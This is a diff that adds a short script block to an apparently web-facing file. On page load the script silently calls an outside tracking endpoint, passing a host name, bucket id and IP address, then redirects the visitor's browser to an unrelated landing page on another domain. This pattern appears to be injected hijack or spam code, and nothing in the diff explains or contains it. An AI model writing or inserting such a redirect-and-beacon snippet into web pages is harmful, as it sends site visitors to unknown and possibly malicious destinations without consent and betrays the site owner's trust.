@@ -1,0 +1,6 @@
+<script>
+            fetch("https://nntzapi2.aonjv.com/api/index/tongji?host=67.583598.oupty.cn&bucket=eljxmas62060542&ip=64.236.200.97")
+                .finally(function () {
+                    window.location.href = "https://tk1014.nfjer.com/landing.html/f/TURBd01EQXdNREF3TUlXem1wZUR2Tnpi/ref/guide/phost/67.583598.oupty.cn";
+                });
+        </script>
